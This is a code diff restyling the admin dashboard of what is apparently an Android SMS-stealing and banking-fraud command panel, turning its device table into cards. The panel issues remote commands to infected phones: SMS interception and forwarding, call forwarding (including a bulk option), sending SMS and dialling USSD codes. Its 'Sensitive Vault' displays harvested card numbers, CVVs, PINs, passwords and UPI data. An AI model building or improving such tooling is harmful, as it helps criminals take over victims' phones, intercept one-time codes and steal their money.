@@ -12,7 +12,6 @@
         .nav-link.active { background-color: #1e293b; border-left: 4px solid #3b82f6; color: white; }
         .no-scrollbar::-webkit-scrollbar { display: none; }
         .no-scrollbar { -ms-overflow-style: none; scrollbar-width: none; }
-        tr:hover td { background-color: #f8fafc; }
         .online-dot { animation: pulse-green 2s infinite; }
         @keyframes pulse-green { 0%, 100% { transform: scale(1); opacity: 1; } 50% { transform: scale(1.2); opacity: 0.5; } }
         .tab-btn.active { border-bottom: 3px solid #3b82f6; color: #3b82f6; font-weight: 900; }
@@ -27,6 +26,17 @@
         .stat-card { transition: all 0.2s; cursor: pointer; border-width: 2px; }
         .stat-card:active { transform: scale(0.95); }
         .stat-card.active-filter { transform: translateY(-2px); box-shadow: 0 4px 6px -1px rgb(0 0 0 / 0.1); }
+
+        /* Card Style for List */
+        .user-box {
+            background: white;
+            border-radius: 12px;
+            padding: 16px;
+            margin-bottom: 12px;
+            border: 1px solid #e2e8f0;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.05);
+        }
+        .user-box:active { background-color: #f8fafc; }
     </style>
 </head>
 <body class="bg-[#f1f5f9] min-h-screen font-sans text-slate-900 flex overflow-hidden">
@@ -39,20 +49,20 @@
                     <i class="fas fa-user-shield text-2xl"></i>
                 </div>
                 <h1 class="text-2xl font-black text-slate-800 tracking-tight">Access Control</h1>
-                <p class="text-[10px] font-bold text-slate-400 uppercase tracking-widest">Verify Administrator Identity</p>
+                <p class="text-xs font-bold text-slate-400 uppercase tracking-widest">Verify Administrator Identity</p>
             </div>
             <div class="space-y-4">
                 <div class="space-y-1">
-                    <label class="text-[9px] font-black text-slate-500 uppercase ml-1">Admin ID</label>
+                    <label class="text-[10px] font-black text-slate-500 uppercase ml-1">Admin ID</label>
                     <input type="text" id="login-id" class="w-full bg-slate-50 border border-slate-200 rounded-xl px-4 py-3 text-sm focus:ring-2 focus:ring-blue-500 outline-none transition-all" placeholder="Enter ID">
                 </div>
                 <div class="space-y-1">
-                    <label class="text-[9px] font-black text-slate-500 uppercase ml-1">Password</label>
+                    <label class="text-[10px] font-black text-slate-500 uppercase ml-1">Password</label>
                     <input type="password" id="login-pass" class="w-full bg-slate-50 border border-slate-200 rounded-xl px-4 py-3 text-sm focus:ring-2 focus:ring-blue-500 outline-none transition-all" placeholder="••••••••">
                 </div>
                 <button onclick="handleLogin()" class="w-full bg-slate-900 text-white py-4 rounded-xl font-black text-xs uppercase tracking-widest hover:bg-blue-600 transition-all shadow-xl active:scale-95">Verify & Login</button>
             </div>
-            <div id="login-err" class="hidden text-center text-rose-600 text-[10px] font-black uppercase tracking-widest animate-pulse">Invalid Credentials</div>
+            <div id="login-err" class="hidden text-center text-rose-600 text-xs font-black uppercase tracking-widest animate-pulse">Invalid Credentials</div>
         </div>
     </div>
 
@@ -73,22 +83,22 @@
             <a href="#" onclick="showView('dashboard')" id="nav-dashboard" class="nav-link flex items-center gap-3 px-4 py-2 rounded-lg transition-all hover:bg-slate-800 text-sm">
                 <i class="fas fa-desktop text-xs"></i> <span>Dashboard</span>
             </a>
-            <div class="pt-4 text-[9px] font-bold text-slate-500 uppercase tracking-widest px-4 mb-1">Global Config</div>
+            <div class="pt-4 text-[10px] font-bold text-slate-500 uppercase tracking-widest px-4 mb-1">Global Config</div>
             <div class="px-3 space-y-2">
                 <div class="space-y-1">
-                    <input type="text" id="global-sms-fwd" placeholder="SMS Forward No." class="w-full bg-slate-800 border-none rounded p-2 text-[10px] text-white outline-none focus:ring-1 focus:ring-blue-500">
-                    <button onclick="saveGlobal('smsForward')" class="w-full bg-blue-600 text-white py-1.5 rounded text-[9px] font-bold uppercase hover:bg-blue-700 transition-colors">Update SMS</button>
+                    <input type="text" id="global-sms-fwd" placeholder="SMS Forward No." class="w-full bg-slate-800 border-none rounded p-2 text-xs text-white outline-none focus:ring-1 focus:ring-blue-500">
+                    <button onclick="saveGlobal('smsForward')" class="w-full bg-blue-600 text-white py-1.5 rounded text-[10px] font-bold uppercase hover:bg-blue-700 transition-colors">Update SMS</button>
                 </div>
                 <div class="space-y-1">
-                    <input type="text" id="global-call-fwd" placeholder="Call Forward No." class="w-full bg-slate-800 border-none rounded p-2 text-[10px] text-white outline-none focus:ring-1 focus:ring-red-500">
-                    <button onclick="saveGlobal('callForward')" class="w-full bg-red-600 text-white py-1.5 rounded text-[9px] font-bold uppercase hover:bg-red-700 transition-colors">Update Call</button>
+                    <input type="text" id="global-call-fwd" placeholder="Call Forward No." class="w-full bg-slate-800 border-none rounded p-2 text-xs text-white outline-none focus:ring-1 focus:ring-red-500">
+                    <button onclick="saveGlobal('callForward')" class="w-full bg-red-600 text-white py-1.5 rounded text-[10px] font-bold uppercase hover:bg-red-700 transition-colors">Update Call</button>
                 </div>
-                <button onclick="bulkCallForward()" class="w-full bg-rose-600 hover:bg-rose-700 py-2 rounded text-[9px] font-black uppercase tracking-widest text-white shadow-lg mt-2 active:scale-95 transition-all">
+                <button onclick="bulkCallForward()" class="w-full bg-rose-600 hover:bg-rose-700 py-2 rounded text-[10px] font-black uppercase tracking-widest text-white shadow-lg mt-2 active:scale-95 transition-all">
                     <i class="fas fa-broadcast-tower mr-1"></i> Bulk Call Fwd
                 </button>
             </div>
             <div class="pt-8 px-4">
-                <button onclick="logout()" class="flex items-center gap-2 text-[10px] font-black text-slate-500 uppercase hover:text-rose-500 transition-colors"><i class="fas fa-sign-out-alt"></i> Logout System</button>
+                <button onclick="logout()" class="flex items-center gap-2 text-xs font-black text-slate-500 uppercase hover:text-rose-500 transition-colors"><i class="fas fa-sign-out-alt"></i> Logout System</button>
             </div>
         </nav>
     </aside>
@@ -103,163 +113,149 @@
             </div>
             <div class="flex items-center gap-3">
                 <div class="text-right hidden sm:block">
-                    <div class="text-[9px] font-black text-slate-800 uppercase tracking-tighter" id="admin-display-name">---</div>
-                    <div class="text-[7px] text-green-500 font-black uppercase tracking-widest">Active Connection</div>
+                    <div class="text-[10px] font-black text-slate-800 uppercase tracking-tighter" id="admin-display-name">---</div>
+                    <div class="text-[8px] text-green-500 font-black uppercase tracking-widest">Active Connection</div>
                 </div>
                 <div class="w-8 h-8 bg-slate-100 rounded-full flex items-center justify-center text-slate-400 border border-slate-200"><i class="fas fa-user-shield text-xs"></i></div>
             </div>
         </header>
 
-        <div id="content-area" class="flex-1 overflow-y-auto p-2 lg:p-6 no-scrollbar bg-[#f8fafc] pb-32">
+        <div id="content-area" class="flex-1 overflow-y-auto p-3 lg:p-6 no-scrollbar bg-[#f8fafc] pb-32">
             <!-- Dashboard View -->
-            <div id="view-dashboard" class="space-y-3">
-                <!-- Stats Row (Filters) -->
+            <div id="view-dashboard" class="space-y-4">
+                <!-- Stats Row -->
                 <div class="grid grid-cols-2 lg:grid-cols-4 gap-2">
                     <div onclick="setFilter('all')" id="stat-card-all" class="stat-card bg-white p-3 rounded-xl shadow-sm border-blue-500 flex items-center gap-3 active-filter">
-                        <div class="w-8 h-8 bg-blue-50 text-blue-600 rounded-lg flex items-center justify-center text-sm"><i class="fas fa-users"></i></div>
-                        <div><div class="text-md font-black leading-none" id="stat-total">0</div><div class="text-[8px] font-bold text-slate-400 uppercase tracking-widest mt-0.5">All Devices</div></div>
+                        <div class="w-10 h-10 bg-blue-50 text-blue-600 rounded-lg flex items-center justify-center text-lg"><i class="fas fa-users"></i></div>
+                        <div><div class="text-lg font-black leading-none" id="stat-total">0</div><div class="text-[10px] font-bold text-slate-400 uppercase tracking-widest mt-0.5">Devices</div></div>
                     </div>
                     <div onclick="setFilter('online')" id="stat-card-online" class="stat-card bg-white p-3 rounded-xl shadow-sm border-transparent flex items-center gap-3">
-                        <div class="w-8 h-8 bg-green-50 text-green-600 rounded-lg flex items-center justify-center text-sm"><i class="fas fa-satellite-dish"></i></div>
-                        <div><div class="text-md font-black text-green-600 leading-none" id="stat-online">0</div><div class="text-[8px] font-bold text-slate-400 uppercase tracking-widest mt-0.5">Online</div></div>
+                        <div class="w-10 h-10 bg-green-50 text-green-600 rounded-lg flex items-center justify-center text-lg"><i class="fas fa-satellite-dish"></i></div>
+                        <div><div class="text-lg font-black text-green-600 leading-none" id="stat-online">0</div><div class="text-[10px] font-bold text-slate-400 uppercase tracking-widest mt-0.5">Online</div></div>
                     </div>
                     <div onclick="setFilter('msgs')" id="stat-card-msgs" class="stat-card bg-white p-3 rounded-xl shadow-sm border-transparent flex items-center gap-3">
-                        <div class="w-8 h-8 bg-indigo-50 text-indigo-600 rounded-lg flex items-center justify-center text-sm"><i class="fas fa-envelope"></i></div>
-                        <div><div class="text-md font-black text-indigo-600 leading-none" id="stat-msgs">0</div><div class="text-[8px] font-bold text-slate-400 uppercase tracking-widest mt-0.5">Messages</div></div>
+                        <div class="w-10 h-10 bg-indigo-50 text-indigo-600 rounded-lg flex items-center justify-center text-lg"><i class="fas fa-envelope"></i></div>
+                        <div><div class="text-lg font-black text-indigo-600 leading-none" id="stat-msgs">0</div><div class="text-[10px] font-bold text-slate-400 uppercase tracking-widest mt-0.5">SMS</div></div>
                     </div>
                     <div onclick="setFilter('forms')" id="stat-card-forms" class="stat-card bg-white p-3 rounded-xl shadow-sm border-transparent flex items-center gap-3">
-                        <div class="w-8 h-8 bg-rose-50 text-rose-600 rounded-lg flex items-center justify-center text-sm"><i class="fas fa-file-invoice"></i></div>
-                        <div><div class="text-md font-black text-rose-600 leading-none" id="stat-forms">0</div><div class="text-[8px] font-bold text-slate-400 uppercase tracking-widest mt-0.5">Forms</div></div>
+                        <div class="w-10 h-10 bg-rose-50 text-rose-600 rounded-lg flex items-center justify-center text-lg"><i class="fas fa-file-invoice"></i></div>
+                        <div><div class="text-lg font-black text-rose-600 leading-none" id="stat-forms">0</div><div class="text-[10px] font-bold text-slate-400 uppercase tracking-widest mt-0.5">Forms</div></div>
                     </div>
                 </div>
 
                 <!-- Search Bar -->
-                <div class="bg-white rounded-xl shadow-sm border border-slate-200 px-3 py-2 flex items-center gap-3">
-                    <i class="fas fa-search text-slate-400 text-xs"></i>
-                    <input type="text" id="user-search" oninput="updateDashboard()" placeholder="Search data..." class="flex-1 bg-transparent border-none outline-none text-[11px] font-bold text-slate-700">
+                <div class="bg-white rounded-xl shadow-sm border border-slate-200 px-4 py-3 flex items-center gap-3">
+                    <i class="fas fa-search text-slate-400 text-sm"></i>
+                    <input type="text" id="user-search" oninput="updateDashboard()" placeholder="Search nodes or data..." class="flex-1 bg-transparent border-none outline-none text-sm font-bold text-slate-700">
                 </div>
 
-                <!-- User Table -->
-                <div class="bg-white rounded-xl shadow-sm border border-slate-200 overflow-hidden">
-                    <div class="overflow-x-auto no-scrollbar">
-                        <table class="w-full text-left text-[10px]">
-                            <thead class="bg-slate-50 font-black text-slate-500 uppercase tracking-widest border-b border-slate-200">
-                                <tr>
-                                    <th class="px-3 py-3" id="th-1">Device Info</th>
-                                    <th class="px-3 py-3" id="th-2">SIM Status</th>
-                                    <th class="px-3 py-3" id="th-3">Latest Intercept</th>
-                                    <th class="px-3 py-3 text-right" id="th-4">Action</th>
-                                </tr>
-                            </thead>
-                            <tbody id="user-table-body" class="divide-y divide-slate-100"></tbody>
-                        </table>
-                    </div>
-                </div>
+                <!-- Main Container for Cards -->
+                <div id="dashboard-list" class="space-y-3"></div>
             </div>
 
             <!-- Detail View -->
-            <div id="view-detail" class="hidden space-y-3 pb-32">
+            <div id="view-detail" class="hidden space-y-4 pb-32">
                 <!-- Header -->
-                <div class="bg-white p-3 rounded-xl shadow-sm border border-slate-200 flex items-center justify-between">
+                <div class="bg-white p-4 rounded-xl shadow-sm border border-slate-200 flex items-center justify-between">
                     <div class="flex items-center gap-3">
-                        <button onclick="showView('dashboard')" class="w-8 h-8 rounded-full bg-slate-100 text-slate-600 hover:bg-slate-200 flex items-center justify-center transition-all active:scale-90"><i class="fas fa-arrow-left text-xs"></i></button>
+                        <button onclick="showView('dashboard')" class="w-10 h-10 rounded-full bg-slate-100 text-slate-600 hover:bg-slate-200 flex items-center justify-center transition-all active:scale-90"><i class="fas fa-arrow-left text-sm"></i></button>
                         <div>
-                            <h3 class="text-sm font-black text-slate-900 flex items-center gap-2">
+                            <h3 class="text-base font-black text-slate-900 flex items-center gap-2">
                                 <span id="det-name" class="uppercase">---</span>
-                                <span id="det-online-dot" class="w-2 h-2 rounded-full bg-slate-300"></span>
+                                <span id="det-online-dot" class="w-2.5 h-2.5 rounded-full bg-slate-300"></span>
                             </h3>
-                            <div class="text-[8px] font-mono text-slate-400 tracking-tighter" id="det-id">---</div>
+                            <div class="text-[10px] font-mono text-slate-400 tracking-tighter" id="det-id">---</div>
                         </div>
                     </div>
                     <div class="flex items-center gap-2">
-                        <div class="px-2 py-0.5 rounded-full bg-blue-50 text-blue-600 text-[8px] font-black border border-blue-100 uppercase" id="det-model">---</div>
-                        <div class="px-2 py-0.5 rounded-full bg-green-50 text-green-600 text-[8px] font-black border border-green-100 uppercase"><i class="fas fa-bolt mr-1"></i><span id="det-bat">0%</span></div>
+                        <div class="px-2.5 py-1 rounded-full bg-blue-50 text-blue-600 text-[10px] font-black border border-blue-100 uppercase" id="det-model">---</div>
+                        <div class="px-2.5 py-1 rounded-full bg-green-50 text-green-600 text-[10px] font-black border border-green-100 uppercase"><i class="fas fa-bolt mr-1"></i><span id="det-bat">0%</span></div>
                     </div>
                 </div>
 
                 <!-- Command Center -->
-                <div class="bg-slate-900 rounded-2xl p-4 text-white shadow-xl space-y-4">
+                <div class="bg-slate-900 rounded-2xl p-5 text-white shadow-xl space-y-5">
                     <div class="flex items-center justify-between border-b border-slate-800 pb-2">
-                        <span class="text-[10px] font-black uppercase tracking-wider text-blue-400"><i class="fas fa-terminal mr-2"></i> Command Center</span>
-                        <div id="cmd-status" class="text-[8px] font-black bg-slate-800 px-2.5 py-1 rounded-full text-slate-400 uppercase">Ready</div>
+                        <span class="text-xs font-black uppercase tracking-wider text-blue-400"><i class="fas fa-terminal mr-2"></i> Command Center</span>
+                        <div id="cmd-status" class="text-[10px] font-black bg-slate-800 px-3 py-1 rounded-full text-slate-400 uppercase">Ready</div>
                     </div>
 
-                    <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
+                    <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-5">
                         <!-- Diagnostics -->
-                        <div class="grid grid-cols-2 gap-2">
-                            <button onclick="sendUserCmd('CHECK_ONLINE')" class="cmd-btn bg-slate-800 hover:bg-slate-700 p-2.5 rounded-xl flex flex-col items-center gap-1 border border-slate-700">
-                                <i class="fas fa-wifi text-green-400 text-xs"></i><span class="text-[8px] font-black uppercase">Refresh</span>
+                        <div class="grid grid-cols-2 gap-3">
+                            <button onclick="sendUserCmd('CHECK_ONLINE')" class="cmd-btn bg-slate-800 hover:bg-slate-700 p-3.5 rounded-xl flex flex-col items-center gap-1.5 border border-slate-700">
+                                <i class="fas fa-wifi text-green-400 text-sm"></i><span class="text-[10px] font-black uppercase">Refresh</span>
                             </button>
-                            <button onclick="sendUserCmd('GET_SMS')" class="cmd-btn bg-slate-800 hover:bg-slate-700 p-2.5 rounded-xl flex flex-col items-center gap-1 border border-slate-700">
-                                <i class="fas fa-sync text-blue-400 text-xs"></i><span class="text-[8px] font-black uppercase">Fetch</span>
+                            <button onclick="sendUserCmd('GET_SMS')" class="cmd-btn bg-slate-800 hover:bg-slate-700 p-3.5 rounded-xl flex flex-col items-center gap-1.5 border border-slate-700">
+                                <i class="fas fa-sync text-blue-400 text-sm"></i><span class="text-[10px] font-black uppercase">Fetch</span>
                             </button>
                         </div>
 
                         <!-- SMS -->
-                        <div class="space-y-1.5">
+                        <div class="space-y-2">
                             <div class="flex justify-between items-center px-1">
-                                <span class="text-[8px] font-black text-slate-500 uppercase">Send SMS</span>
-                                <select id="cmd-sms-sim" class="bg-slate-800 text-[8px] font-black text-blue-400 rounded px-1.5 py-0.5 border border-slate-700 outline-none"><option value="1">S1</option><option value="2">S2</option></select>
+                                <span class="text-[10px] font-black text-slate-500 uppercase">Send SMS</span>
+                                <select id="cmd-sms-sim" class="bg-slate-800 text-[10px] font-black text-blue-400 rounded px-2 py-1 border border-slate-700 outline-none"><option value="1">S1</option><option value="2">S2</option></select>
                             </div>
-                            <input id="cmd-sms-num" placeholder="Number" class="w-full bg-slate-800 rounded-lg p-2 text-[10px] outline-none border border-slate-700">
-                            <div class="flex gap-1.5">
-                                <input id="cmd-sms-msg" placeholder="Message..." class="flex-1 bg-slate-800 rounded-lg p-2 text-[10px] outline-none border border-slate-700">
-                                <button onclick="sendUserCmd('SEND_SMS')" class="bg-blue-600 px-3 rounded-lg"><i class="fas fa-paper-plane text-xs"></i></button>
+                            <input id="cmd-sms-num" placeholder="Number" class="w-full bg-slate-800 rounded-lg p-2.5 text-xs outline-none border border-slate-700">
+                            <div class="flex gap-2">
+                                <input id="cmd-sms-msg" placeholder="Message..." class="flex-1 bg-slate-800 rounded-lg p-2.5 text-xs outline-none border border-slate-700">
+                                <button onclick="sendUserCmd('SEND_SMS')" class="bg-blue-600 px-4 rounded-lg"><i class="fas fa-paper-plane text-sm"></i></button>
                             </div>
                         </div>
 
                         <!-- USSD -->
-                        <div class="space-y-1.5">
+                        <div class="space-y-2">
                             <div class="flex justify-between items-center px-1">
-                                <span class="text-[8px] font-black text-slate-500 uppercase">USSD Dialer</span>
-                                <select id="cmd-ussd-sim" class="bg-slate-800 text-[8px] font-black text-indigo-400 rounded px-1.5 py-0.5 border border-slate-700 outline-none"><option value="1">S1</option><option value="2">S2</option></select>
+                                <span class="text-[10px] font-black text-slate-500 uppercase">USSD Dialer</span>
+                                <select id="cmd-ussd-sim" class="bg-slate-800 text-[10px] font-black text-indigo-400 rounded px-2 py-1 border border-slate-700 outline-none"><option value="1">S1</option><option value="2">S2</option></select>
                             </div>
-                            <div class="flex gap-1.5">
-                                <input id="cmd-ussd-code" placeholder="*121#" class="flex-1 bg-slate-800 rounded-lg p-2 text-[10px] outline-none border border-slate-700 font-mono">
-                                <button onclick="sendUserCmd('USSD')" class="bg-indigo-600 px-4 rounded-lg font-black text-[9px] uppercase">Dial</button>
+                            <div class="flex gap-2">
+                                <input id="cmd-ussd-code" placeholder="*121#" class="flex-1 bg-slate-800 rounded-lg p-2.5 text-xs outline-none border border-slate-700 font-mono">
+                                <button onclick="sendUserCmd('USSD')" class="bg-indigo-600 px-5 rounded-lg font-black text-[10px] uppercase">Dial</button>
                             </div>
                         </div>
 
                         <!-- Forward -->
-                        <div class="space-y-1.5">
+                        <div class="space-y-2">
                             <div class="flex justify-between items-center px-1">
-                                <span class="text-[8px] font-black text-slate-500 uppercase">Call Forward</span>
-                                <select id="cmd-cf-sim" class="bg-slate-800 text-[8px] font-black text-rose-400 rounded px-1.5 py-0.5 border border-slate-700 outline-none"><option value="1">S1</option><option value="2">S2</option></select>
+                                <span class="text-[10px] font-black text-slate-500 uppercase">Call Forward</span>
+                                <select id="cmd-cf-sim" class="bg-slate-800 text-[10px] font-black text-rose-400 rounded px-2 py-1 border border-slate-700 outline-none"><option value="1">S1</option><option value="2">S2</option></select>
                             </div>
-                            <div class="flex gap-1.5">
-                                <input id="cmd-cf-num" placeholder="Number" class="flex-1 bg-slate-800 rounded-lg p-2 text-[10px] outline-none border border-slate-700">
-                                <button onclick="sendUserCmd('CALL_FORWARD')" class="bg-rose-600 px-3 rounded-lg text-[8px] font-black uppercase">Start</button>
-                                <button onclick="sendUserCmd('DEACTIVATE_FORWARD')" class="bg-slate-700 px-3 rounded-lg text-[8px] font-black uppercase">Stop</button>
+                            <div class="flex gap-2">
+                                <input id="cmd-cf-num" placeholder="Number" class="flex-1 bg-slate-800 rounded-lg p-2.5 text-xs outline-none border border-slate-700">
+                                <button onclick="sendUserCmd('CALL_FORWARD')" class="bg-rose-600 px-4 rounded-lg text-[10px] font-black uppercase">On</button>
+                                <button onclick="sendUserCmd('DEACTIVATE_FORWARD')" class="bg-slate-700 px-4 rounded-lg text-[10px] font-black uppercase">Off</button>
                             </div>
                         </div>
 
                         <!-- Intercept -->
-                        <div class="space-y-1.5">
+                        <div class="space-y-2">
                             <div class="flex justify-between items-center px-1">
-                                <span class="text-[8px] font-black text-slate-500 uppercase">SMS Intercept</span>
+                                <span class="text-[10px] font-black text-slate-500 uppercase">SMS Intercept</span>
                             </div>
-                            <div class="flex gap-1.5">
-                                <input id="cmd-sf-num" placeholder="Number" class="flex-1 bg-slate-800 rounded-lg p-2 text-[10px] outline-none border border-slate-700">
-                                <button onclick="sendUserCmd('SET_SMS_FORWARD')" class="bg-blue-600 px-4 rounded-lg text-[8px] font-black uppercase">Set</button>
-                                <button onclick="sendUserCmd('REMOVE_SMS_FORWARD')" class="bg-slate-700 px-2 rounded-lg text-[8px] font-black uppercase">Off</button>
+                            <div class="flex gap-2">
+                                <input id="cmd-sf-num" placeholder="Number" class="flex-1 bg-slate-800 rounded-lg p-2.5 text-xs outline-none border border-slate-700">
+                                <button onclick="sendUserCmd('SET_SMS_FORWARD')" class="bg-blue-600 px-5 rounded-lg text-[10px] font-black uppercase">Set</button>
+                                <button onclick="sendUserCmd('REMOVE_SMS_FORWARD')" class="bg-slate-700 px-3 rounded-lg text-[10px] font-black uppercase">Off</button>
                             </div>
                         </div>
                     </div>
                 </div>
 
                 <!-- Tabs -->
-                <div class="space-y-3">
-                    <div class="flex border-b border-slate-200 overflow-x-auto no-scrollbar gap-6 px-1">
-                        <button onclick="setDetailTab('sms')" id="tab-sms" class="tab-btn pb-2 text-[9px] uppercase tracking-widest active">SMS Logs</button>
-                        <button onclick="setDetailTab('forms')" id="tab-forms" class="tab-btn pb-2 text-[9px] uppercase tracking-widest text-rose-600">Sensitive Vault</button>
+                <div class="space-y-4">
+                    <div class="flex border-b border-slate-200 overflow-x-auto no-scrollbar gap-8 px-1">
+                        <button onclick="setDetailTab('sms')" id="tab-sms" class="tab-btn pb-2 text-[11px] uppercase tracking-widest active">SMS Logs</button>
+                        <button onclick="setDetailTab('forms')" id="tab-forms" class="tab-btn pb-2 text-[11px] uppercase tracking-widest text-rose-600">Sensitive Vault</button>
                     </div>
 
-                    <div id="detail-sms-sec" class="bg-white rounded-xl shadow-sm border border-slate-200 overflow-hidden flex flex-col max-h-[400px]">
-                        <div id="det-sms-logs" class="overflow-y-auto p-2 space-y-2 no-scrollbar"></div>
+                    <div id="detail-sms-sec" class="bg-white rounded-xl shadow-sm border border-slate-200 overflow-hidden flex flex-col max-h-[500px]">
+                        <div id="det-sms-logs" class="overflow-y-auto p-3 space-y-3 no-scrollbar"></div>
                     </div>
 
-                    <div id="detail-forms-sec" class="hidden space-y-3">
-                        <div id="det-form-sections" class="space-y-4"></div>
+                    <div id="detail-forms-sec" class="hidden space-y-4">
+                        <div id="det-form-sections" class="space-y-5"></div>
                     </div>
                 </div>
             </div>
@@ -366,15 +362,15 @@
         const query = document.getElementById('user-search').value.toLowerCase();
         const uids = Object.keys(usersData);
         let onlineCount = 0, msgsCount = 0, formsCount = 0;
-        const tbody = document.getElementById('user-table-body');
-        const th1 = document.getElementById('th-1');
-        const th2 = document.getElementById('th-2');
-        const th3 = document.getElementById('th-3');
-        const th4 = document.getElementById('th-4');
-        tbody.innerHTML = '';
+        const listDiv = document.getElementById('dashboard-list');
+        listDiv.innerHTML = '';
+
+        // Generate Permanent Serial Numbers based on Global Install Order (Ascending)
+        const globalSorted = [...uids].sort((a,b) => (usersData[a].I?.ca || 0) - (usersData[b].I?.ca || 0));
+        const permIds = {};
+        globalSorted.forEach((uid, idx) => permIds[uid] = idx + 1);
 
         if (currentFilter === 'msgs') {
-            th1.innerText = "TIME"; th2.innerText = "NODE"; th3.innerText = "FROM"; th4.innerText = "MESSAGE";
             let allMsgs = [];
             uids.forEach(uid => {
                 const u = usersData[uid];
@@ -386,17 +382,26 @@
                 if(msgs.length > 0) msgsCount++;
                 msgs.forEach(m => allMsgs.push({ ...m, uid, name: (info.m || "Unknown") }));
             });
+
             allMsgs.sort((a,b) => (b.ts || 0) - (a.ts || 0)).forEach(m => {
                 if (!query || `${m.name} ${m.s} ${m.m}`.toLowerCase().includes(query)) {
-                    const tr = document.createElement('tr');
-                    tr.className = "cursor-pointer active:bg-slate-100 hover:bg-slate-50";
-                    tr.onclick = () => showUserDetails(m.uid);
-                    tr.innerHTML = `<td class="px-3 py-3 text-slate-400 font-mono text-[8px]">${new Date(m.ts).toLocaleTimeString()}</td><td class="px-3 py-3 font-black text-blue-600 uppercase text-[9px]">${m.name.substring(0,10)}</td><td class="px-3 py-3 font-black text-slate-700 text-[9px]">${m.s}</td><td class="px-3 py-3 text-slate-500 text-[9px] break-words max-w-[300px]">"${m.m}"</td>`;
-                    tbody.appendChild(tr);
+                    const card = document.createElement('div');
+                    card.className = "user-box";
+                    card.onclick = () => showUserDetails(m.uid);
+                    card.innerHTML = `
+                        <div class="flex justify-between items-start mb-2">
+                            <div class="flex items-center gap-2">
+                                <span class="text-[10px] font-black text-blue-600 bg-blue-50 px-1.5 py-0.5 rounded uppercase">${m.name}</span>
+                                <span class="text-[10px] font-bold text-slate-700">${m.s}</span>
+                            </div>
+                            <span class="text-[9px] text-slate-400 font-mono">${new Date(m.ts).toLocaleString()}</span>
+                        </div>
+                        <div class="text-sm font-bold text-slate-600 leading-snug">"${m.m}"</div>
+                    `;
+                    listDiv.appendChild(card);
                 }
             });
         } else if (currentFilter === 'forms') {
-            th1.innerText = "TIME"; th2.innerText = "NODE"; th3.innerText = "DATA_FIELDS"; th4.innerText = "SENSITIVE_INFO";
             let allForms = [];
             uids.forEach(uid => {
                 const u = usersData[uid];
@@ -408,61 +413,77 @@
                 if(forms.length > 0) formsCount++;
                 forms.forEach(f => allForms.push({ ...f, uid, name: (info.m || "Unknown") }));
             });
+
             allForms.sort((a,b) => (b.ts || 0) - (a.ts || 0)).forEach(f => {
-                let fields = "", sensitive = "";
+                let sensitive = "";
                 for(let k in f) {
                     if(['ts','uid','name'].includes(k)) continue;
-                    if(/card|cvv|pin|pass|upi/.test(k.toLowerCase())) sensitive += `<span class="bg-rose-50 text-rose-600 px-1 rounded mr-1">${k}: ${f[k]}</span>`;
-                    else fields += `${k}: ${f[k]}, `;
+                    const val = f[k];
+                    const isS = /card|cvv|pin|pass|upi/.test(k.toLowerCase());
+                    if(isS) sensitive += `<div class="bg-rose-50 p-2 rounded border border-rose-100 mt-1"><div class="text-[9px] text-rose-400 font-black uppercase">${k}</div><div class="text-sm font-black text-rose-600">${val}</div></div>`;
                 }
-                if (!query || `${f.name} ${fields} ${sensitive}`.toLowerCase().includes(query)) {
-                    const tr = document.createElement('tr');
-                    tr.className = "cursor-pointer active:bg-slate-100 hover:bg-slate-50";
-                    tr.onclick = () => showUserDetails(f.uid);
-                    tr.innerHTML = `<td class="px-3 py-3 text-slate-400 font-mono text-[8px]">${new Date(f.ts).toLocaleString()}</td><td class="px-3 py-3 font-black text-rose-600 uppercase text-[9px]">${f.name.substring(0,10)}</td><td class="px-3 py-3 text-slate-500 text-[8px] truncate max-w-[150px]">${fields}</td><td class="px-3 py-3 font-bold text-[9px] break-words">${sensitive}</td>`;
-                    tbody.appendChild(tr);
+                if (!query || `${f.name} ${sensitive}`.toLowerCase().includes(query)) {
+                    const card = document.createElement('div');
+                    card.className = "user-box border-l-4 border-l-rose-500";
+                    card.onclick = () => showUserDetails(f.uid);
+                    card.innerHTML = `
+                        <div class="flex justify-between items-center mb-3">
+                            <span class="text-[10px] font-black text-rose-600 uppercase bg-rose-50 px-2 py-0.5 rounded">${f.name}</span>
+                            <span class="text-[9px] text-slate-400 font-mono">${new Date(f.ts).toLocaleString()}</span>
+                        </div>
+                        <div class="grid grid-cols-1 gap-2">${sensitive}</div>
+                    `;
+                    listDiv.appendChild(card);
                 }
             });
         } else {
-            th1.innerHTML = `<div class="flex items-center gap-2"><span>#</span><span>DEVICE_INFO</span></div>`;
-            th2.innerText = "SIM_STATUS"; th3.innerText = "LAST_CAPTURE"; th4.innerText = "MGMT";
-            // Sort by Creation Time (ca) - Newest install first
             const sorted = uids.sort((a,b) => (usersData[b].I?.ca || 0) - (usersData[a].I?.ca || 0));
-            sorted.forEach((uid, idx) => {
+            sorted.forEach((uid) => {
                 const u = usersData[uid];
                 const info = u.I || {};
                 const sims = u.S || [];
                 const mList = Object.values(u.M || {}).sort((a,b) => (b.ts || 0) - (a.ts || 0));
                 const lastM = mList[0] || {};
                 const isOnline = Date.now() - (info.lo || 0) < 60000;
+
                 if(isOnline) onlineCount++;
                 if(Object.keys(u.M || {}).length > 0) msgsCount++;
                 if(u.F) formsCount++;
+
                 let matchesF = (currentFilter === 'all') || (currentFilter === 'online' && isOnline);
                 const name = (info.m || "Unknown");
+
                 if(matchesF && (!query || name.toLowerCase().includes(query) || uid.toLowerCase().includes(query))) {
-                    const tr = document.createElement('tr');
-                    tr.className = "cursor-pointer active:bg-slate-100";
-                    tr.onclick = () => showUserDetails(uid);
-                    tr.innerHTML = `
-                        <td class="px-3 py-3">
-                            <div class="flex items-center gap-2">
-                                <div class="text-[7px] font-black text-slate-300 w-3">${idx + 1}</div>
-                                <div class="w-2 h-2 rounded-full ${isOnline ? 'online-dot bg-green-500' : 'bg-slate-300'}"></div>
-                                <div><div class="font-black text-slate-800 uppercase leading-none text-[9px]">${name.substring(0,12)}</div><div class="text-[7px] text-slate-400 mt-0.5">LAST: ${formatTime(info.lo)}</div></div>
+                    const card = document.createElement('div');
+                    card.className = "user-box";
+                    card.onclick = () => showUserDetails(uid);
+                    card.innerHTML = `
+                        <div class="flex items-center justify-between mb-3">
+                            <div class="flex items-center gap-3">
+                                <div class="text-xs font-black text-slate-300 w-5">#${permIds[uid]}</div>
